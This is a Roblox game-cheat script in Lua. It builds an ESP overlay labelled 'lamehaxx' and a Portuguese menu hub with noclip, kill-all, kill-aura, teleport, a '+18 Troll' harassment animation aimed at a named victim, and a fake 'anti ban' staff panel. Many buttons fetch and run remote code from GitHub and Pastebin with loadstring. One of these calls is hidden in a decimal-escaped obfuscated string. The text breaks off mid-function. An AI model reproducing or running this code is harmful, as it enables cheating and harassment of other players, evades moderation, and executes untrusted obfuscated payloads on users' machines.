local ce_g = CreateInstance('TextBox',{ClearTextOnFocus=true,Font=Enum.Font.Gotham,FontSize=Enum.FontSize.Size14,MultiLine=false,Text='',TextColor3=Color3.new(0, 1, 0), PlaceholderText='', PlaceholderColor3=Color3.new(0, 1, 0),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,Active=true,AnchorPoint=Vector2.new(1, 0),BackgroundColor3=Color3.new(0.121569, 0.12549, 0.172549),BackgroundTransparency=0,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1, -29, 0, 2),Rotation=0,Selectable=true,Size=UDim2.new(0, 27, 0, 14),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='ce_g',Parent = b_ce})
local ce_r = CreateInstance('TextBox',{ClearTextOnFocus=true,Font=Enum.Font.Gotham,FontSize=Enum.FontSize.Size14,MultiLine=false,Text='',TextColor3=Color3.new(1, 0, 0), PlaceholderText='', PlaceholderColor3=Color3.new(1, 0, 0),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,Active=true,AnchorPoint=Vector2.new(1, 0),BackgroundColor3=Color3.new(0.121569, 0.12549, 0.172549),BackgroundTransparency=0,BorderColor3=Color3.new(1, 0, 0.498039),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1, -56, 0, 2),Rotation=0,Selectable=true,Size=UDim2.new(0, 27, 0, 14),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='ce_r',Parent = b_ce})
local watermark = CreateInstance('TextLabel',{Font=Enum.Font.Code,FontSize=Enum.FontSize.Size14,Text='lamehaxx v0.01',TextColor3=Color3.new(0, 0, 0),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=1,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 2, 0, -34),Rotation=0,Selectable=false,Size=UDim2.new(0, 200, 0, 20),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=20,Name='watermark',Parent = age1})
local watermark1 = CreateInstance('TextLabel',{Font=Enum.Font.Code,FontSize=Enum.FontSize.Size14,Text='lamehaxx v0.01',TextColor3=Color3.new(1, 0, 0.498039),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=0,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=1,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, -2, 0, -2),Rotation=0,Selectable=false,Size=UDim2.new(0, 200, 0, 20),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=20,Name='watermark1',Parent = watermark})
p_visuals.Draggable = true
 
title1.LayoutOrder = 0 title1_2.LayoutOrder = 1
b_b.LayoutOrder = 1 b_f.LayoutOrder = 2 b_f_t.LayoutOrder = 3 b_sd.LayoutOrder = 4 b_sn.LayoutOrder = 5 b_sh.LayoutOrder = 6 b_ht.LayoutOrder = 7 b_rt.LayoutOrder = 8 b_tc.LayoutOrder = 9 b_ct.LayoutOrder = 10 b_ce.LayoutOrder = 11
 
local localplayer = game:GetService"Players".LocalPlayer
local uis = game:GetService"UserInputService"
 
local cheats = {
    b_b = false;
    b_f = false;
    b_f_t = 1;
    b_sd = false;
    b_sn = false;
    b_sh = false;
    b_ht = "Text";
    b_rt = false;
    b_tc = false;
}
 
local cheatsf = Instance.new("Folder", game.CoreGui) cheatsf.Name = "cheats"
local espf = Instance.new("Folder", cheatsf) espf.Name = "esp"
 
function addEsp(player)
    local bbg = Instance.new("BillboardGui", espf)
    bbg.Name = player.Name
    bbg.AlwaysOnTop = true
    bbg.Size = UDim2.new(4,0,5.4,0)
    bbg.ClipsDescendants = false
    
    local outlines = Instance.new("Frame", bbg)
    outlines.Size = UDim2.new(1,0,1,0)
    outlines.BorderSizePixel = 0
    outlines.BackgroundTransparency = 1
    local left = Instance.new("Frame", outlines)
    left.BorderSizePixel = 0
    left.Size = UDim2.new(0,1,1,0)
    local right = left:Clone()
    right.Parent = outlines
    right.Size = UDim2.new(0,-1,1,0)
    right.Position = UDim2.new(1,0,0,0)
    local up = left:Clone()
    up.Parent = outlines
    up.Size = UDim2.new(1,0,0,1)
    local down = left:Clone()
    down.Parent = outlines
    down.Size = UDim2.new(1,0,0,-1)
    down.Position = UDim2.new(0,0,1,0)
    
    local info = Instance.new("BillboardGui", bbg)
    info.Name = "info"
    info.Size = UDim2.new(3,0,0,54)
    info.StudsOffset = Vector3.new(3.6,-3,0)
    info.AlwaysOnTop = true
    info.ClipsDescendants = false
    local namelabel = Instance.new("TextLabel", info)
    namelabel.Name = "namelabel"
    namelabel.BackgroundTransparency = 1
    namelabel.TextStrokeTransparency = 0
    namelabel.TextXAlignment = Enum.TextXAlignment.Left
    namelabel.Size = UDim2.new(0,100,0,18)
    namelabel.Position = UDim2.new(0,0,0,0)
    namelabel.Text = player.Name
    local distancel = Instance.new("TextLabel", info)
    distancel.Name = "distancelabel"
    distancel.BackgroundTransparency = 1
    distancel.TextStrokeTransparency = 0
    distancel.TextXAlignment = Enum.TextXAlignment.Left
    distancel.Size = UDim2.new(0,100,0,18)
    distancel.Position = UDim2.new(0,0,0,18)
    local healthl = Instance.new("TextLabel", info)
    healthl.Name = "healthlabel"
    healthl.BackgroundTransparency = 1
    healthl.TextStrokeTransparency = 0
    healthl.TextXAlignment = Enum.TextXAlignment.Left
    healthl.Size = UDim2.new(0,100,0,18)
    healthl.Position = UDim2.new(0,0,0,36)
    
    local uill = Instance.new("UIListLayout", info)
    
    local forhealth = Instance.new("BillboardGui", bbg)
    forhealth.Name = "forhealth"
    forhealth.Size = UDim2.new(5,0,6,0)
    forhealth.AlwaysOnTop = true
    forhealth.ClipsDescendants = false
    
    local healthbar = Instance.new("Frame", forhealth)
    healthbar.Name = "healthbar"
    healthbar.BackgroundColor3 = Color3.fromRGB(40,40,40)
    healthbar.BorderColor3 = Color3.fromRGB(0,0,0)
    healthbar.Size = UDim2.new(0.04,0,0.9,0)
    healthbar.Position = UDim2.new(0,0,0.05,0)
    local bar = Instance.new("Frame", healthbar)
    bar.Name = "bar"
    bar.BorderSizePixel = 0
    bar.BackgroundColor3 = Color3.fromRGB(94,255,69)
    bar.AnchorPoint = Vector2.new(0,1)
    bar.Position = UDim2.new(0,0,1,0)
    bar.Size = UDim2.new(1,0,1,0)
    
    local co = coroutine.create(function()
        while wait(0.1) do
            if (player.Character and player.Character:FindFirstChild"HumanoidRootPart") then
                bbg.Adornee = player.Character.HumanoidRootPart
                info.Adornee = player.Character.HumanoidRootPart
                forhealth.Adornee = player.Character.HumanoidRootPart
                
                if (player.Team ~= localplayer.Team) then
                    bbg.Enabled = true
                    info.Enabled = true
                    forhealth.Enabled = true
                end
                if player.Character:FindFirstChild("ForceField") then
                    outlines.BackgroundTransparency = 0.4
                    left.BackgroundTransparency = 0.4
                    right.BackgroundTransparency = 0.4
                    up.BackgroundTransparency = 0.4
                    down.BackgroundTransparency = 0.4
                    healthl.TextTransparency = 0.4
                    healthl.TextStrokeTransparency = 0.8
                    distancel.TextTransparency = 0.4
                    distancel.TextStrokeTransparency = 0.8
                    namelabel.TextTransparency = 0.4
                    namelabel.TextStrokeTransparency = 0.8
                    bar.BackgroundTransparency = 0.4
                    healthbar.BackgroundTransparency = 0.8
                else
                    outlines.BackgroundTransparency = 0
                    left.BackgroundTransparency = 0
                    right.BackgroundTransparency = 0
                    up.BackgroundTransparency = 0
                    down.BackgroundTransparency = 0
                    healthl.TextTransparency = 0
                    healthl.TextStrokeTransparency = 0
                    distancel.TextTransparency = 0
                    distancel.TextStrokeTransparency = 0
                    namelabel.TextTransparency = 0
                    namelabel.TextStrokeTransparency = 0
                    bar.BackgroundTransparency = 0
                    healthbar.BackgroundTransparency = 0
                end
                if cheats.b_b == true then
                    outlines.Visible = true
                else
                    outlines.Visible = false
                end
                if cheats.b_f == true then
                    if player.Character:FindFirstChild("ForceField") then
                        outlines.BackgroundTransparency = 0.9
                    else
                        outlines.BackgroundTransparency = cheats.b_f_t
                    end
                else
                    outlines.BackgroundTransparency = 1
                end
                if cheats.b_sh == true then
                    if (player.Character:FindFirstChild"Humanoid") then
                        healthl.Text = "Health: "..math.floor(player.Character:FindFirstChild"Humanoid".Health)
                        healthbar.bar.Size = UDim2.new(1,0,player.Character:FindFirstChild"Humanoid".Health/player.Character:FindFirstChild"Humanoid".MaxHealth,0)
                    end
                    if cheats.b_ht == "Text" then
                        healthbar.Visible = false
                        healthl.Visible = true
                    end
                    if cheats.b_ht == "Bar" then
                        healthl.Visible = false
                        healthbar.Visible = true
                    end
                    if cheats.b_ht == "Both" then
                        healthl.Visible = true
                        healthbar.Visible = true
                    end
                else
                    healthl.Visible = false
                    healthbar.Visible = false
                end
                if cheats.b_sn then
                    namelabel.Visible = true
                else
                    namelabel.Visible = false
                end
                if cheats.b_sd == true then
                    distancel.Visible = true
                    if (localplayer.Character and localplayer.Character:FindFirstChild"HumanoidRootPart") then
                        distancel.Text = "Distance: "..math.floor(0.5+(localplayer.Character:FindFirstChild"HumanoidRootPart".Position - player.Character:FindFirstChild"HumanoidRootPart".Position).magnitude)
                    end
                else
                    distancel.Visible = false
                end
                if cheats.b_rt == true then
                    if (player.Team == localplayer.Team) then
                        bbg.Enabled = true
                        info.Enabled = true
                        forhealth.Enabled = true
                    end
                else
                    if (player.Team == localplayer.Team) then
                        bbg.Enabled = false
                        info.Enabled = false
                        forhealth.Enabled = false
                    end
                end
                if cheats.b_tc == true then
                    outlines.BackgroundColor3 = player.TeamColor.Color
                    left.BackgroundColor3 = player.TeamColor.Color
                    right.BackgroundColor3 = player.TeamColor.Color
                    up.BackgroundColor3 = player.TeamColor.Color
                    down.BackgroundColor3 = player.TeamColor.Color
                    healthl.TextColor3 = player.TeamColor.Color
                    distancel.TextColor3 = player.TeamColor.Color
                    namelabel.TextColor3 = player.TeamColor.Color
                else
                    if (player.Team == localplayer.Team) then
                        outlines.BackgroundColor3 = Color3.fromRGB(ct_r.Text, ct_g.Text, ct_b.Text)
                        left.BackgroundColor3 = Color3.fromRGB(ct_r.Text, ct_g.Text, ct_b.Text)
                        right.BackgroundColor3 = Color3.fromRGB(ct_r.Text, ct_g.Text, ct_b.Text)
                        up.BackgroundColor3 = Color3.fromRGB(ct_r.Text, ct_g.Text, ct_b.Text)
                        down.BackgroundColor3 = Color3.fromRGB(ct_r.Text, ct_g.Text, ct_b.Text)
                        healthl.TextColor3 = Color3.fromRGB(ct_r.Text, ct_g.Text, ct_b.Text)
                        distancel.TextColor3 = Color3.fromRGB(ct_r.Text, ct_g.Text, ct_b.Text)
                        namelabel.TextColor3 = Color3.fromRGB(ct_r.Text, ct_g.Text, ct_b.Text)
                    else
                        outlines.BackgroundColor3 = Color3.fromRGB(ce_r.Text, ce_g.Text, ce_b.Text)
                        left.BackgroundColor3 = Color3.fromRGB(ce_r.Text, ce_g.Text, ce_b.Text)
                        right.BackgroundColor3 = Color3.fromRGB(ce_r.Text, ce_g.Text, ce_b.Text)
                        up.BackgroundColor3 = Color3.fromRGB(ce_r.Text, ce_g.Text, ce_b.Text)
                        down.BackgroundColor3 = Color3.fromRGB(ce_r.Text, ce_g.Text, ce_b.Text)
                        healthl.TextColor3 = Color3.fromRGB(ce_r.Text, ce_g.Text, ce_b.Text)
                        distancel.TextColor3 = Color3.fromRGB(ce_r.Text, ce_g.Text, ce_b.Text)
                        namelabel.TextColor3 = Color3.fromRGB(ce_r.Text, ce_g.Text, ce_b.Text)
                    end
                end
            end
            if not (game:GetService"Players":FindFirstChild(player.Name)) then
                print(player.Name.." has left. Clearing esp.")
                espf:FindFirstChild(player.Name):Destroy()
                coroutine.yield()
            end
        end
    end)
    coroutine.resume(co)
end
 
--main
do
    wait(2)
    --menu buttons
    for _,button in pairs(age1:GetDescendants()) do
        if button:IsA"TextButton" then
            button.MouseButton1Click:connect(function()
                if button.Name == "b_f_t" then
                    if cheats.b_f_t >= 0 then
                        cheats.b_f_t = cheats.b_f_t+0.1
                        if cheats.b_f_t > 1 then
                            cheats.b_f_t = 0
                        end
                    end
                    button.v.Text = cheats.b_f_t
                elseif button.Name == "b_ht" then
                    if cheats.b_ht == "Text" then
                        cheats.b_ht = "Bar"
                    elseif cheats.b_ht == "Bar" then
                        cheats.b_ht = "Both"
                    else
                        cheats.b_ht = "Text"
                    end
                    button.v.Text = cheats.b_ht
                else
                    if cheats[button.Name] == true then
                        cheats[button.Name] = false
                        button.v.Text = "OFF"
                        button.v.TextColor3 = Color3.fromRGB(255,0,0)
                    else
                        cheats[button.Name] = true
                        button.v.Text = "ON"
                        button.v.TextColor3 = Color3.fromRGB(0,255,0)
                    end
                end 
            end)
        end
    end
    
    --initial player addition
    for _,v in pairs(game:GetService("Players"):GetChildren()) do
        if not (v.Name == localplayer.Name) then
            if not (espf:FindFirstChild(v.Name)) then
                addEsp(v)
            end
        end
    end
    
    --open/close gui
    game:GetService("UserInputService").InputBegan:connect(function(input, gameProcessed)
        if input.KeyCode == Enum.KeyCode.KeypadOne then
            if not gameProcessed then
                age1.Enabled = not age1.Enabled
            end
        end
    end)
    
    --auto-update
    while wait(10) do
        for _,v in pairs(game:GetService("Players"):GetChildren()) do
            if not (v.Name == localplayer.Name) then
                if not (espf:FindFirstChild(v.Name)) then
                    addEsp(v)
                end
            end
        end
    end
end
          end              
    })
local Section = PlayersTab:AddSection({
	Name = "Player"
})
    PlayersTab:AddButton({
        Name = "Voar - Bypass",
        Callback = function()
            loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
          end   
})
    PlayersTab:AddButton({
        Name = "Atravessar Parade",
        Callback = function()
            -- Farewell Infortality.
-- Version: 2.82
-- Instances:
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Drag = Instance.new("TextButton")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
--Properties:
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(1, 1, 1)
Frame.Position = UDim2.new(0.275453836, 0, 0.186732173, 0)
Frame.Size = UDim2.new(0, 379, 0, 373)
 
Drag.Name = "Pedroxz Menu V2 Noclip"
Drag.Parent = Frame
Drag.BackgroundColor3 = Color3.new(1, 1, 1)
Drag.BorderColor3 = Color3.new(0.917647, 0.917647, 0.917647)
Drag.Size = UDim2.new(0, 379, 0, 27)
Drag.Text = "Pedroxz Menu V2 Noclip"
Drag.TextColor3 = Color3.new(0, 0, 0)
 
TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton.Position = UDim2.new(0.261265785, 0, 0.352023244, 0)
TextButton.Size = UDim2.new(0, 200, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Noclip R15"
TextButton.TextColor3 = Color3.new(0, 0, 0)
TextButton.TextSize = 14
TextButton.MouseButton1Down:connect(function()
nam = game.Players.LocalPlayer.Name
 
game:GetService('RunService').Stepped:connect(function()
for a, b in pairs(game.Workspace:GetChildren()) do
if b.Name == nam then
for i, v in pairs(game.Workspace[nam]:GetChildren()) do
if v:IsA("BasePart") then
v.CanCollide = false
 
end
end
end
end
end)
 
Workspace[nam].Head.Changed:connect(function()
for a, b in pairs(game.Workspace:GetChildren()) do
if b.Name == nam then
for i, v in pairs(game.Workspace[nam]:GetChildren()) do
if v:IsA("BasePart") then
v.CanCollide = false
 
end
end
end
end
end)
end)
 
TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton_2.Position = UDim2.new(0.261265785, 0, 0.615844727, 0)
TextButton_2.Size = UDim2.new(0, 200, 0, 50)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Noclip R6"
TextButton_2.TextColor3 = Color3.new(0, 0, 0)
TextButton_2.TextSize = 14
TextButton_2.MouseButton1Down:connect(function()
game.Players.LocalPlayer.Character.Humanoid.MaxHealth = math.huge
game.Players.LocalPlayer.Character.Humanoid.Health = math.huge
while true do
	game:GetService("RunService").Stepped:wait()
	game.Players.LocalPlayer.Character.Head.CanCollide = false
	game.Players.LocalPlayer.Character.Torso.CanCollide = false
end
end)
 
TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.Position = UDim2.new(0.104106054, 0, 0.111652002, 0)
TextLabel.Size = UDim2.new(0, 299, 0, 50)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Noclip By Pedroxz Menu V2"
TextLabel.TextColor3 = Color3.new(0, 0, 0)
TextLabel.TextSize = 14
TextLabel.TextWrapped = true
-- Scripts:
function SCRIPT_GBXM85_FAKESCRIPT() -- Drag.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = Drag
	wanttobemoved=script.Parent.Parent
	X=wanttobemoved.Position.X.Offset
	Y=wanttobemoved.Position.Y.Offset
	XS=wanttobemoved.Position.X.Scale
	YS=wanttobemoved.Position.Y.Scale
	function down(posX,posY)--the positions of the mouse
		drag=true--activate the drag function
		X=wanttobemoved.Position.X.Offset--redefines the value "X"
		Y=wanttobemoved.Position.Y.Offset--redefines the value "Y"
		XS=wanttobemoved.Position.X.Scale
		YS=wanttobemoved.Position.Y.Scale
		DposX=posX-X--the mouse's X position offset by the frame's X position.
		DposY=posY-Y--the mouse's Y position offset by the frame's Y position.
		print(""..DposX..","..DposY.."")--remembers the values DposX and DposY in the output toolbar.
	end
	function up()
		drag=false--deactivate the drag
	end
	function move(posX,posY)--again, the positions of the mouse
		if drag then--if held down then
			wanttobemoved.Position=UDim2.new(XS,posX - DposX,YS,posY - DposY)
		end
	end
	script.Parent.MouseButton1Down:connect(down)
	script.Parent.MouseButton1Up:connect(up)
	script.Parent.MouseLeave:connect(up)
	script.Parent.MouseMoved:connect(move)
 
end
coroutine.resume(coroutine.create(SCRIPT_GBXM85_FAKESCRIPT))

          end   
})
    TrollTab:AddButton({
        Name = "Kill all - Regime militar de 83",
        Callback = function()
            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Pedroxz63/killall/main/README.md'),true))()
          end   
})
    TrollTab:AddButton({
        Name = "Kill Aura - Risco Crash",
        Callback = function()
            loadstring(game:HttpGetAsync("https://pastebin.com/raw/PpALBidP"))()
          end   
})
    PlayersTab:AddButton({
        Name = "Teleport Player",
        Callback = function()
            ----------------------
-- SHARK X HUB NO 1 --
----------------------
 
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Pedroxz Teleport", "DarkTheme")
local Tab = Window:NewTab("Players")
local Section = Tab:NewSection("Teleport")
 
--------------------
 
players = {}
 
for i,v in pairs(game:GetService("Players"):GetChildren()) do
   table.insert(players,v.Name)
end
 
Section:NewDropdown("Select Player", " ", players, function(abc)
    Select = abc
end)
 
 
Section:NewButton("Refresh", " ", function()
    table.clear(players)
for i,v in pairs(game:GetService("Players"):GetChildren()) do
   table.insert(players,v.Name)
end
end)
 
Section:NewButton("Teleport", " ", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Select].Character.HumanoidRootPart.CFrame
end)
          end   
})  
local Section = PlayersTab:AddSection({
	Name = "Cheat"
})
PlayersTab:AddButton({
	Name = "+18 Troll",
	Callback = function()
        local Victim='Pedroxz'
        local A=Instance.new'Animation'
        A.AnimationId='rbxassetid://148840371'
        local P=game:GetService'Players'.LocalPlayer
        local C=P.Character or P.CharacterAdded:Wait()
        local H=C:WaitForChild'Humanoid':LoadAnimation(A)
        H:Play()
        H:AdjustSpeed(2.5)
        game:GetService'RunService'.Stepped:Connect(function()
            C:WaitForChild'HumanoidRootPart'.CFrame=CFrame.new(game:GetService'Players':FindFirstChild(Victim).Character:WaitForChild'HumanoidRootPart'.Position)
        end)
  	end    
})
PlayersTab:AddButton({
	Name = "Staff Online (!)",
	Callback = function()
		local StaffOnline = Instance.new("ScreenGui")
		local Frame = Instance.new("Frame")
		local UICorner = Instance.new("UICorner")
		local Frame_2 = Instance.new("Frame")
		local UICorner_2 = Instance.new("UICorner")
		local TextLabel = Instance.new("TextLabel")
		local TextLabel_2 = Instance.new("TextLabel")
		local TextLabel_3 = Instance.new("TextLabel")
		local TextLabel_4 = Instance.new("TextLabel")
		local TextLabel_5 = Instance.new("TextLabel")
		local TextButton = Instance.new("TextButton")
		local Frame_3 = Instance.new("Frame")
		local Frame_4 = Instance.new("Frame")
		
		--Config e fundo etc
		
		StaffOnline.Name = "Staff Online"
		StaffOnline.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
		StaffOnline.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		
		Frame.Parent = StaffOnline
		Frame.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
		Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Frame.BorderSizePixel = 0
		Frame.Position = UDim2.new(0.691468894, 0, 0.270807445, 0)
		Frame.Size = UDim2.new(0, 350, 0, 369)
		Frame.Draggable = true
		Frame.Active = true
		Frame.Selectable = true
		
		UICorner.Parent = Frame
		
		Frame_2.Parent = Frame
		Frame_2.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
		Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Frame_2.BorderSizePixel = 0
		Frame_2.Position = UDim2.new(0.0271547157, 0, 0.0290527344, 0)
		Frame_2.Size = UDim2.new(0, 340, 0, 358)
		
		UICorner_2.Parent = Frame_2
		
		TextLabel.Parent = Frame_2
		TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.BackgroundTransparency = 1.000
		TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
		TextLabel.BorderSizePixel = 0
		TextLabel.Position = UDim2.new(0.191176474, 0, 0, 0)
		TextLabel.Size = UDim2.new(0, 200, 0, 50)
		TextLabel.Font = Enum.Font.SourceSansBold
		TextLabel.Text = "Staffs OnLine"
		TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.TextScaled = true
		TextLabel.TextSize = 14.000
		TextLabel.TextWrapped = true
		
		TextLabel_2.Parent = TextLabel
		TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel_2.BackgroundTransparency = 1.000
		TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
		TextLabel_2.BorderSizePixel = 0
		TextLabel_2.Position = UDim2.new(0.136176765, 0, 0.800000012, 0)
		TextLabel_2.Size = UDim2.new(0, 126, 0, 36)
		TextLabel_2.Font = Enum.Font.SourceSansItalic
		TextLabel_2.Text = "(7)"
		TextLabel_2.TextColor3 = Color3.fromRGB(0, 255, 8)
		TextLabel_2.TextScaled = true
		TextLabel_2.TextSize = 14.000
		TextLabel_2.TextWrapped = true
		
		TextLabel_3.Parent = TextLabel_2
		TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel_3.BackgroundTransparency = 1.000
		TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
		TextLabel_3.BorderSizePixel = 0
		TextLabel_3.Position = UDim2.new(-0.00667995866, 0, 1.49444413, 0)
		TextLabel_3.Size = UDim2.new(0, 126, 0, 36)
		TextLabel_3.Font = Enum.Font.SourceSansItalic
		TextLabel_3.Text = "Player 1"
		TextLabel_3.TextColor3 = Color3.fromRGB(255, 0, 4)
		TextLabel_3.TextScaled = true
		TextLabel_3.TextSize = 14.000
		TextLabel_3.TextWrapped = true
		
		TextLabel_4.Parent = TextLabel_3
		TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel_4.BackgroundTransparency = 1.000
		TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
		TextLabel_4.BorderSizePixel = 0
		TextLabel_4.Position = UDim2.new(-0.00667995866, 0, 1.49444413, 0)
		TextLabel_4.Size = UDim2.new(0, 126, 0, 36)
		TextLabel_4.Font = Enum.Font.SourceSansItalic
		TextLabel_4.Text = "Player 2"
		TextLabel_4.TextColor3 = Color3.fromRGB(255, 0, 4)
		TextLabel_4.TextScaled = true
		TextLabel_4.TextSize = 14.000
		TextLabel_4.TextWrapped = true
		
		TextLabel_5.Parent = TextLabel_4
		TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel_5.BackgroundTransparency = 1.000
		TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
		TextLabel_5.BorderSizePixel = 0
		TextLabel_5.Position = UDim2.new(-0.536126971, 0, 1.63888884, 0)
		TextLabel_5.Size = UDim2.new(0, 283, 0, 134)
		TextLabel_5.Font = Enum.Font.Unknown
		TextLabel_5.Text = "Encontramos Um Erro Na Busca De Procurar Staffs Online (Erro SCRIPT Adonis Detect) Protetor Anti Ban"
		TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel_5.TextScaled = true
		TextLabel_5.TextSize = 14.000
		TextLabel_5.TextWrapped = true
		
		TextButton.Parent = Frame_2
		TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextButton.BackgroundTransparency = 1.000
		TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
		TextButton.BorderSizePixel = 0
		TextButton.Position = UDim2.new(0.688235283, 0, -0.00201245537, 0)
		TextButton.Size = UDim2.new(0, 149, 0, 38)
		TextButton.Font = Enum.Font.SourceSansBold
		TextButton.Text = "X"
		TextButton.TextColor3 = Color3.fromRGB(255, 0, 0)
		TextButton.TextScaled = true
		TextButton.TextSize = 14.000
		TextButton.TextStrokeColor3 = Color3.fromRGB(255, 11, 44)
		TextButton.TextWrapped = true
		TextButton.MouseButton1Down:Connect(function()
			Frame:Destroy()
		end)
		
		Frame_3.Parent = Frame_2
		Frame_3.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		Frame_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Frame_3.BorderSizePixel = 0
		Frame_3.Position = UDim2.new(0.0235294122, 0, 0.0195530728, 0)
		Frame_3.Size = UDim2.new(0, 7, 0, 337)
		
		Frame_4.Parent = Frame_3
		Frame_4.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
		Frame_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Frame_4.BorderSizePixel = 0
		Frame_4.Position = UDim2.new(45.3092384, 0, -0.00715315714, 0)
		Frame_4.Size = UDim2.new(0, 7, 0, 337)
  	end   
})
PlayersTab:AddButton({
	Name = "Auto Pos",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/G-development-M/DreckModz/main/By_dreck_/AutoPos.lua'))()
  	end   
})
PlayersTab:AddButton({
	Name = "Ver Inventario Da Pessoa",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/pedroxzytbhypee/inventariobydrec/main/README.md'))()
  	end  
})
PlayersTab:AddButton({
	Name = "Drops Pelo Mapa (TGI)",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/pedroxzytbhypee/dropss/main/README.md'))()
  	end  
})
PlayersTab:AddButton({
	Name = "Teleport Cadeira (!)",
	Callback = function()
        local Player = game:GetService("Players").LocalPlayer
        local Character = Player.Character
        Character["Right Arm"].Size = Vector3.new(8,5,5)
        Character["Left Arm"].Size = Vector3.new(8,5,5)
        Character["Right Arm"].Transparency = 1
        Character["Left Arm"].Transparency = 1
        Character["Right Leg"].Size = Vector3.new(63.539, 2, 46.212)
        Character["Left Leg"].Size = Vector3.new(63.539, 2, 46.212)
        Character["Right Leg"].Transparency = 1
        Character["Left Leg"].Transparency = 1
        Character["Torso"].Size = Vector3.new(5,5,5)
        Character["Torso"].Transparency = 1
        Character.HumanoidRootPart.Size = Vector3.new(63.539, 2, 46.212)
        Character.HumanoidRootPart.Size = Vector3.new(63.539, 2, 46.212)
